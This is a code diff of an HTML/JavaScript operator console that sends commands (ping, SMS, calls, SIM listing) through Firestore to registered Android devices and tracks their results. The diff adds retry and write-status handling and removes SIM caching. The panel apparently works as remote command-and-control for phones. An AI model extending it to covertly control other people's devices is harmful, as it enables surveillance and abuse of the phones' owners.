@@ -146,19 +146,15 @@
         .device-card .dc-meta {
             display: flex; gap: 12px; font-size: 12px; color: #6b7280; flex-wrap: wrap;
         }
-        .device-card .dc-meta .sim-info {
-            background: #1e2230;
-            padding: 2px 8px;
-            border-radius: 4px;
-            font-size: 10px;
-            color: #a78bfa;
-        }
         .device-card .dc-enter {
             margin-top: 12px; font-size: 10px; text-transform: uppercase;
             letter-spacing: 0.5px; color: #6c5ce7; font-weight: 600;
         }
         .device-card .dc-del-hint {
             font-size: 9px; color: #4a4f5f; margin-top: 3px;
+        }
+        .device-card .dc-last-ping {
+            font-size: 9px; color: #5a6070; margin-top: 2px;
         }
 
         .empty-state {
@@ -211,9 +207,12 @@
             font-size: 10px; text-transform: uppercase; letter-spacing: 0.5px;
             padding: 2px 8px; border-radius: 6px; font-weight: 700;
         }
+        .result-item .ri-status.sending { background: #1e3a5f22; color: #60a5fa; }
+        .result-item .ri-status.sent { background: #1e2230; color: #9ba1b2; }
         .result-item .ri-status.pending { background: #1e2230; color: #fbbf24; }
         .result-item .ri-status.ok { background: #065f4622; color: #34d399; }
         .result-item .ri-status.error { background: #7f1d1d22; color: #f87171; }
+        .result-item .ri-status.write_fail { background: #7f1d1d22; color: #fb923c; }
         .result-item .ri-time { font-size: 11px; color: #6b7280; }
         .result-item .ri-output {
             font-family: 'SF Mono', 'Fira Code', monospace;
@@ -226,7 +225,6 @@
         .results-header span { font-size: 12px; color: #6b7280; }
         .empty { color: #6b7280; font-size: 13px; text-align: center; padding: 24px; }
 
-        /* Context Menu */
         .context-menu {
             position: fixed; z-index: 9999;
             background: #161b2b; border: 1px solid #262b3a;
@@ -243,7 +241,6 @@
         .context-menu .cm-item.danger { color: #f87171; }
         .context-menu .cm-item .cm-icon { width: 18px; text-align: center; }
 
-        /* Modals */
         .modal-overlay {
             position: fixed; top: 0; left: 0; right: 0; bottom: 0;
             background: rgba(0,0,0,0.6); backdrop-filter: blur(4px);
@@ -279,7 +276,6 @@
         .modal-buttons { display: flex; gap: 10px; margin-top: 18px; justify-content: flex-end; }
         .modal-buttons .btn { font-size: 12px; padding: 7px 16px; }
 
-        /* Settings Modal */
         .settings-group { margin: 12px 0; }
         .settings-group label { font-size: 11px; text-transform: uppercase; letter-spacing: 0.5px; color: #5a6070; display: block; margin-top: 12px; font-weight: 600; }
         .settings-group input { width: 100%; padding: 8px 12px; border-radius: 6px; background: #0b0d12; border: 1px solid #1e2230; color: #e4e7ed; font-size: 12px; font-family: 'SF Mono', monospace; margin-top: 3px; }
@@ -314,6 +310,13 @@
         }
         @keyframes spin { to { transform: rotate(360deg); } }
 
+        .retry-btn {
+            font-size: 10px; background: transparent; border: 1px solid #fb923c44;
+            color: #fb923c; padding: 2px 8px; border-radius: 4px;
+            cursor: pointer; margin-left: 6px;
+        }
+        .retry-btn:hover { background: #fb923c22; }
+
         @media (max-width: 768px) {
             .sidebar { display: none; }
             .main { padding: 16px; }
@@ -327,7 +330,6 @@
 
     <div class="app-shell">
 
-        <!-- Sidebar -->
         <aside class="sidebar">
             <div class="sidebar-header">
                 <div class="logo">MC</div>
@@ -349,7 +351,6 @@
                     <div id="sidebarAuth" style="margin-top:4px;font-size:10px;word-break:break-all;"></div>
                     <div id="sidebarDeviceCount" style="margin-top:4px;">Devices: —</div>
                     <div id="sidebarPingStatus" style="margin-top:4px;font-size:10px;color:#5a6070;"></div>
-                    <div id="sidebarSimInfo" style="margin-top:4px;font-size:10px;color:#a78bfa;"></div>
                 </div>
             </nav>
             <div class="sidebar-footer">
@@ -359,7 +360,6 @@
             </div>
         </aside>
 
-        <!-- Main -->
         <div class="main">
 
             <!-- ═══ DASHBOARD VIEW ═══ -->
@@ -391,6 +391,10 @@
                         <div class="label">Ping Watch</div>
                         <div class="value yellow" id="dashPingStatus">Idle</div>
                     </div>
+                    <div class="status-card">
+                        <div class="label">Write Status</div>
+                        <div class="value green" id="dashWriteStatus">Ready</div>
+                    </div>
                 </div>
 
                 <div id="deviceListContainer">
@@ -410,12 +414,11 @@
                     <div class="topbar-left">
                         <h2>⌘ Command Center</h2>
                         <p>Device: <span id="cmdDeviceDisplay" style="font-family:monospace;">—</span></p>
-                        <p id="cmdSimDisplay" style="font-size:11px;color:#a78bfa;margin-top:2px;"></p>
                     </div>
                     <div class="topbar-right">
                         <button class="btn btn-ghost btn-sm" onclick="showView('dashboard')">← Back</button>
-                        <button class="btn btn-ghost btn-sm" onclick="refreshSimInfo()" id="refreshSimBtn" style="display:none;">⟳ SIMs</button>
                         <button class="btn btn-ghost btn-sm" onclick="clearCmdResults()">Clear</button>
+                        <button class="btn btn-ghost btn-sm" onclick="retryLastFailedCmd()">↻ Retry Failed</button>
                     </div>
                 </div>
 
@@ -449,13 +452,11 @@
         </div>
     </div>
 
-    <!-- Context Menu -->
     <div class="context-menu" id="contextMenu">
         <div class="cm-item" onclick="contextAction('enter')"><span class="cm-icon">⌘</span> Enter Command Center</div>
         <div class="cm-item danger" onclick="contextAction('delete')"><span class="cm-icon">🗑️</span> Delete Device</div>
     </div>
 
-    <!-- Delete Modal -->
     <div class="modal-overlay" id="deleteModal">
         <div class="modal-box">
             <h3>🗑️ Delete Device</h3>
@@ -467,7 +468,6 @@
         </div>
     </div>
 
-    <!-- Param Modal -->
     <div class="modal-overlay" id="paramModal">
         <div class="modal-box">
             <h3 id="modalTitle">Action</h3>
@@ -489,7 +489,6 @@
         </div>
     </div>
 
-    <!-- Settings Modal -->
     <div class="modal-overlay" id="settingsModal">
         <div class="modal-box" style="max-width:500px;">
             <h3>⚙️ Firebase Configuration</h3>
@@ -526,12 +525,11 @@
         </div>
     </div>
 
-    <!-- Toast Container -->
     <div class="toast-container" id="toastContainer"></div>
 
 <script>
     // ═══════════════════════════════════════════════════════
-    //  COMMAND CATALOG  —  FULLY SYNCED WITH SIM SUPPORT
+    //  COMMAND CATALOG
     // ═══════════════════════════════════════════════════════
     const CAT_NAMES = {
         device: 'Device Control',
@@ -627,10 +625,7 @@
         contextDeviceId: null,
         pendingModalCmd: null,
         deviceUnsubscribe: null,
-        // SIM cache: map of deviceId -> {sims: [{slot, carrierName}], timestamp}
-        simCache: {},
-        // Pending SIM result listeners
-        simResultListeners: {},
+        writeStatus: 'ready', // ready, writing
     };
 
     let firebaseInitialized = false;
@@ -760,135 +755,41 @@
         else { el.innerHTML = '<span class="loading-spinner" style="width:12px;height:12px;border-width:2px;vertical-align:middle;margin-right:6px;"></span> ' + msg; el.style.color = '#fbbf24'; }
     }
 
+    function setWriteStatus(type, msg) {
+        const el = document.getElementById('dashWriteStatus');
+        if (type === 'ready') { el.textContent = '✅ ' + msg; el.className = 'value green'; }
+        else if (type === 'writing') { el.innerHTML = '<span class="loading-spinner" style="width:14px;height:14px;border-width:2px;vertical-align:middle;margin-right:4px;"></span> ' + msg; el.className = 'value yellow'; }
+        else if (type === 'error') { el.textContent = '❌ ' + msg; el.className = 'value red'; }
+    }
+
     // ═══════════════════════════════════════════════════════
-    //  AUTO-PING
+    //  AUTO-PING — with write confirmation
     // ═══════════════════════════════════════════════════════
-    function pingOfflineDevices() {
+    async function pingOfflineDevices() {
         if (!firebaseInitialized || !db || state.devices.length === 0) return;
         const now = Date.now();
         let pinged = 0;
-        state.devices.forEach(d => {
+        for (const d of state.devices) {
             const lastSeen = d.lastSeen || 0;
             const age = now - lastSeen;
             if (age > 30000 && age < 600000) {
                 const cmdId = now + '_' + Math.random().toString(36).slice(2, 8) + '_ping';
-                db.collection('commands').doc(cmdId).set({
-                    deviceId: d.id, action: 'ping', params: {}, createdAt: Date.now()
-                }).catch(() => {});
-                pinged++;
+                try {
+                    await db.collection('commands').doc(cmdId).set({
+                        deviceId: d.id, action: 'ping', params: {}, createdAt: Date.now()
+                    });
+                    pinged++;
+                } catch (e) {
+                    appendDiag(`⚠️ Ping write failed for ${d.id.slice(0,8)}: ${e.message}`);
+                }
             }
-        });
+        }
         pingCount += pinged;
         if (pinged > 0) appendDiag(`⚡ Pinged ${pinged} device(s) to wake up`);
         const pingEl = document.getElementById('dashPingStatus');
         if (pingEl) pingEl.textContent = pinged > 0 ? `Pinging ${pinged}…` : 'Watching';
         const sidebarPing = document.getElementById('sidebarPingStatus');
         if (sidebarPing) sidebarPing.textContent = `Pings sent: ${pingCount}`;
-    }
-
-    // ═══════════════════════════════════════════════════════
-    //  SIM INFO MANAGEMENT
-    // ═══════════════════════════════════════════════════════
-    function fetchSimInfo(deviceId) {
-        if (!firebaseInitialized || !db || !deviceId) return;
-        appendDiag(`📱 Requesting SIM info for ${deviceId.slice(0, 8)}…`);
-        const cmdId = Date.now() + '_' + Math.random().toString(36).slice(2, 8) + '_sims';
-
-        // Listen for the result
-        const unsub = db.collection('results').doc(cmdId).onSnapshot(snap => {
-            if (snap.exists) {
-                const data = snap.data();
-                if (data.status === 'ok') {
-                    const output = data.output || '';
-                    parseAndCacheSimInfo(deviceId, output);
-                }
-                unsub();
-            }
-        });
-
-        // Timeout cleanup
-        setTimeout(() => { unsub(); }, 30000);
-
-        // Send the command
-        db.collection('commands').doc(cmdId).set({
-            deviceId: deviceId,
-            action: 'list_sims',
-            params: {},
-            createdAt: Date.now()
-        }).catch(() => {});
-    }
-
-    function parseAndCacheSimInfo(deviceId, output) {
-        const sims = [];
-        // Output format: "slot 1: Vodafone | slot 2: Orange"
-        const parts = output.split('|');
-        parts.forEach(p => {
-            const match = p.trim().match(/slot (\d+):\s*(.+)/i);
-            if (match) {
-                sims.push({ slot: parseInt(match[1]), carrierName: match[2].trim() });
-            }
-        });
-
-        state.simCache[deviceId] = {
-            sims: sims,
-            timestamp: Date.now()
-        };
-
-        appendDiag(`📱 SIM info for ${deviceId.slice(0, 8)}: ${sims.map(s => `Slot ${s.slot}: ${s.carrierName}`).join(', ') || 'no SIMs'}`);
-
-        // Update sidebar SIM display
-        updateSidebarSimInfo(deviceId, sims);
-
-        // If we're in Command Center for this device, update the SIM dropdown
-        if (state.selectedDeviceId === deviceId) {
-            updateSimDropdown(sims);
-            // Show refresh button
-            document.getElementById('refreshSimBtn').style.display = 'inline-flex';
-        }
-    }
-
-    function updateSidebarSimInfo(deviceId, sims) {
-        const el = document.getElementById('sidebarSimInfo');
-        if (sims && sims.length > 0) {
-            el.textContent = '📱 ' + sims.map(s => `S${s.slot}: ${s.carrierName}`).join(' | ');
-        } else if (deviceId && state.simCache[deviceId]) {
-            const cached = state.simCache[deviceId].sims;
-            if (cached.length > 0) {
-                el.textContent = '📱 ' + cached.map(s => `S${s.slot}: ${s.carrierName}`).join(' | ');
-            } else {
-                el.textContent = '📱 No SIM info';
-            }
-        }
-    }
-
-    function updateSimDropdown(sims) {
-        const select = document.getElementById('simSlotSelect');
-        // Keep the "Auto" option
-        select.innerHTML = '<option value="">📱 Auto / Default SIM</option>';
-        if (sims && sims.length > 0) {
-            sims.forEach(s => {
-                const opt = document.createElement('option');
-                opt.value = s.slot.toString();
-                opt.textContent = `SIM ${s.slot} — ${s.carrierName}`;
-                select.appendChild(opt);
-            });
-        } else {
-            // Fallback: generic SIM 1 / SIM 2
-            select.innerHTML += '<option value="1">SIM 1</option><option value="2">SIM 2</option>';
-        }
-        const info = document.getElementById('simSlotInfo');
-        if (sims && sims.length > 0) {
-            info.textContent = `${sims.length} active SIM(s) detected`;
-        } else if (state.devices.find(d => d.id === state.selectedDeviceId)) {
-            info.textContent = 'Unknown — sending list_sims may reveal carriers';
-        }
-    }
-
-    function refreshSimInfo() {
-        if (state.selectedDeviceId) {
-            fetchSimInfo(state.selectedDeviceId);
-            toast('Requesting SIM info…', 'info');
-        }
     }
 
     // ═══════════════════════════════════════════════════════
@@ -985,7 +886,7 @@
                 const online = isOnline(d);
                 const short = d.id.slice(0, 8) + '…' + d.id.slice(-6);
                 const lastSeenAgo = d.lastSeen ? Math.floor((Date.now() - d.lastSeen) / 1000) + 's ago' : '—';
-                const hasToken = d.fcmToken ? '🔔 Push' : '📴 No FCM';
+                const hasToken = d.fcmToken ? '🔔 FCM' : '📴 No FCM';
                 return `
                     <div class="device-card ${online ? 'online' : ''}"
                          onclick="onDeviceTap('${d.id}')"
@@ -1103,21 +1004,6 @@
         document.getElementById('cmdLastStatus').className = 'value green';
         document.getElementById('cmdDeviceDisplay').textContent = deviceId.slice(0, 8) + '…' + deviceId.slice(-6);
         document.getElementById('cmdDeviceDisplay').title = deviceId;
-
-        // Try to show cached SIM info
-        const cached = state.simCache[deviceId];
-        const simDisplay = document.getElementById('cmdSimDisplay');
-        const refreshBtn = document.getElementById('refreshSimBtn');
-        if (cached && cached.sims.length > 0) {
-            simDisplay.textContent = '📱 ' + cached.sims.map(s => `SIM ${s.slot}: ${s.carrierName}`).join(' | ');
-            refreshBtn.style.display = 'inline-flex';
-        } else {
-            simDisplay.textContent = '📱 No SIM info — tap ⟳ SIMs to scan';
-            refreshBtn.style.display = 'inline-flex';
-            // Auto-fetch SIM info
-            fetchSimInfo(deviceId);
-        }
-
         renderCmdCategories('device');
         renderCmdResults();
         showView('command');
@@ -1125,7 +1011,7 @@
     }
 
     // ═══════════════════════════════════════════════════════
-    //  COMMAND CENTER
+    //  COMMAND CENTER — WITH PROPER STATUS TRACKING
     // ═══════════════════════════════════════════════════════
     function renderCmdCategories(activeCat) {
         const grid = document.getElementById('commandGrid');
@@ -1175,13 +1061,9 @@
                 fields.appendChild(input);
             });
         }
-        // Show SIM selector for commands that need it
         const simSelector = document.getElementById('modalSimSelector');
         if (cmd.simSlot) {
             simSelector.style.display = 'block';
-            // Populate with cached SIM info if available
-            const cached = state.simCache[state.selectedDeviceId];
-            updateSimDropdown(cached ? cached.sims : []);
         } else {
             simSelector.style.display = 'none';
         }
@@ -1197,13 +1079,10 @@
         if (!cmd) return;
         const params = {};
         document.querySelectorAll('#modalFields input').forEach(inp => { params[inp.dataset.paramKey] = inp.value; });
-        // Add SIM slot if selector is visible
         const simSelector = document.getElementById('modalSimSelector');
         if (simSelector.style.display !== 'none') {
             const simVal = document.getElementById('simSlotSelect').value;
             if (simVal) {
-                // The Android side expects "sim" param for send_sms and "sim_slot" for start_call
-                // We'll send both "sim_slot" (generic) and "sim" (for backward compat with send_sms)
                 params.sim_slot = simVal;
                 params.sim = simVal;
             }
@@ -1218,46 +1097,100 @@
     async function executeCmd(cmd, params) {
         const deviceId = state.selectedDeviceId;
         if (!deviceId || !firebaseInitialized || !db) { toast('No device selected or not connected', 'error'); return; }
+        
         const cmdId = Date.now() + '_' + Math.random().toString(36).slice(2, 8);
         const now = new Date().toLocaleTimeString();
         const actionLabel = cmd.name || cmd.action;
-        state.results.unshift({ id: cmdId, action: cmd.action, name: actionLabel, status: 'pending', output: 'Sent…', time: now });
-        state.commandsSent++;
-        document.getElementById('cmdCountDisplay').textContent = state.commandsSent;
+        
+        // === PHASE 1: show "sending" ===
+        state.results.unshift({ 
+            id: cmdId, 
+            action: cmd.action, 
+            name: actionLabel, 
+            status: 'sending', 
+            output: 'Writing to Firestore…', 
+            time: now,
+            params: params
+        });
         renderCmdResults();
+        setWriteStatus('writing', 'writing command…');
+
+        // === PHASE 2: write to Firestore with await for confirmation ===
         try {
-            await db.collection('commands').doc(cmdId).set({ deviceId: deviceId, action: cmd.action, params: params, createdAt: Date.now() });
-            toast('→ ' + actionLabel, 'info');
+            const docRef = db.collection('commands').doc(cmdId);
+            await docRef.set({ 
+                deviceId: deviceId, 
+                action: cmd.action, 
+                params: params, 
+                createdAt: Date.now() 
+            });
+            // Write succeeded — update to "sent"
+            updateCmdResult(cmdId, 'sent', 'Command written to Firestore. Waiting for device to execute…');
+            toast('→ ' + actionLabel + ' written to server', 'info');
+            setWriteStatus('ready', 'Write OK');
+            state.commandsSent++;
+            document.getElementById('cmdCountDisplay').textContent = state.commandsSent;
+
+            // === PHASE 3: listen for result with timeout ===
             const unsub = db.collection('results').doc(cmdId).onSnapshot(snap => {
                 if (snap.exists) {
                     const d = snap.data();
                     updateCmdResult(cmdId, d.status || 'error', d.output || '—');
                     unsub();
-                    // If this was a list_sims result, parse it
-                    if (cmd.action === 'list_sims' && d.status === 'ok') {
-                        parseAndCacheSimInfo(deviceId, d.output || '');
-                    }
-                    toast(d.status === 'ok' ? '✓ ' + actionLabel : '✗ ' + actionLabel, d.status === 'ok' ? 'success' : 'error');
+                    toast(d.status === 'ok' ? '✓ ' + actionLabel : '✗ ' + actionLabel, 
+                          d.status === 'ok' ? 'success' : 'error');
                 }
             });
-            setTimeout(() => { updateCmdResult(cmdId, 'error', 'Timeout (30s)'); unsub(); }, 30000);
-        } catch (e) { updateCmdResult(cmdId, 'error', e.message); toast('Failed: ' + e.message, 'error'); }
+            setTimeout(() => { 
+                // Check if still pending — mark as timeout
+                const found = state.results.find(r => r.id === cmdId);
+                if (found && (found.status === 'sent' || found.status === 'pending')) {
+                    updateCmdResult(cmdId, 'error', '⏱️ Timeout after 30s — device did not respond. Check if device is online and CommandPoller is running.');
+                    unsub();
+                    toast('⏱️ ' + actionLabel + ' timed out', 'error');
+                }
+            }, 30000);
+
+        } catch (e) {
+            // Write FAILED
+            updateCmdResult(cmdId, 'write_fail', '❌ Firestore write failed: ' + e.message);
+            toast('Write failed: ' + e.message, 'error');
+            setWriteStatus('error', 'Write failed: ' + e.message);
+        }
     }
 
     function updateCmdResult(id, status, output) {
         const found = state.results.find(r => r.id === id);
-        if (found) { found.status = status; found.output = output; }
+        if (found) { 
+            found.status = status; 
+            found.output = output; 
+        }
         renderCmdResults();
-        document.getElementById('cmdLastStatus').textContent = status;
-        document.getElementById('cmdLastStatus').className = 'value ' + (status === 'ok' ? 'green' : status === 'error' ? 'red' : 'yellow');
+        const lastStatusEl = document.getElementById('cmdLastStatus');
+        if (status === 'ok') { lastStatusEl.textContent = 'OK'; lastStatusEl.className = 'value green'; }
+        else if (status === 'error') { lastStatusEl.textContent = 'FAIL'; lastStatusEl.className = 'value red'; }
+        else if (status === 'write_fail') { lastStatusEl.textContent = 'WRITE FAIL'; lastStatusEl.className = 'value red'; }
+        else if (status === 'sending') { lastStatusEl.textContent = 'Sending…'; lastStatusEl.className = 'value yellow'; }
+        else if (status === 'sent') { lastStatusEl.textContent = 'Sent'; lastStatusEl.className = 'value yellow'; }
+        else { lastStatusEl.textContent = status; lastStatusEl.className = 'value yellow'; }
     }
 
     function renderCmdResults() {
         const body = document.getElementById('resultsBody');
-        document.getElementById('cmdResultCount').textContent = state.results.length + ' results';
-        document.getElementById('cmdResultCount2').textContent = state.results.length + ' results';
-        if (state.results.length === 0) { body.innerHTML = '<div class="empty">Results appear here</div>'; return; }
-        body.innerHTML = state.results.map(r => '<div class="result-item"><div class="ri-top"><span class="ri-action">' + (r.name || r.action) + '</span><span class="ri-status ' + r.status + '">' + r.status + '</span><span class="ri-time">' + r.time + '</span></div><div class="ri-output">' + escapeHtml(r.output) + '</div></div>').join('');
+        const count = state.results.length;
+        document.getElementById('cmdResultCount').textContent = count + ' results';
+        document.getElementById('cmdResultCount2').textContent = count + ' results';
+        if (count === 0) { body.innerHTML = '<div class="empty">Results appear here</div>'; return; }
+        body.innerHTML = state.results.map(r => {
+            const statusClass = r.status;
+            const canRetry = r.status === 'write_fail' || r.status === 'error';
+            return '<div class="result-item"><div class="ri-top">' +
+                '<span class="ri-action">' + (r.name || r.action) + '</span>' +
+                '<span class="ri-status ' + statusClass + '">' + statusClass + '</span>' +
+                '<span class="ri-time">' + r.time + '</span>' +
+                (canRetry ? '<button class="retry-btn" onclick="retryCmd(\'' + r.id + '\')">↻ Retry</button>' : '') +
+                '</div><div class="ri-output">' + escapeHtml(r.output) + '</div></div>';
+        }).join('');
     }
 
     function clearCmdResults() {
@@ -1266,6 +1199,30 @@
         document.getElementById('cmdLastStatus').textContent = 'Ready';
         document.getElementById('cmdLastStatus').className = 'value green';
         renderCmdResults();
+    }
+
+    function retryCmd(id) {
+        const found = state.results.find(r => r.id === id);
+        if (!found) return;
+        // Remove this result and re-execute
+        state.results = state.results.filter(r => r.id !== id);
+        renderCmdResults();
+        // Find the original command from COMMANDS and re-execute
+        for (const cat of Object.values(COMMANDS)) {
+            const match = cat.find(c => c.action === found.action && c.name === found.name);
+            if (match) {
+                executeCmd(match, found.params || {});
+                return;
+            }
+        }
+        // Fallback: reconstruct
+        executeCmd({ name: found.name, action: found.action, params: found.params || {} }, found.params || {});
+    }
+
+    function retryLastFailedCmd() {
+        const failed = state.results.find(r => r.status === 'write_fail' || r.status === 'error');
+        if (failed) retryCmd(failed.id);
+        else toast('No failed commands to retry', 'info');
     }
 
     // ═══════════════════════════════════════════════════════
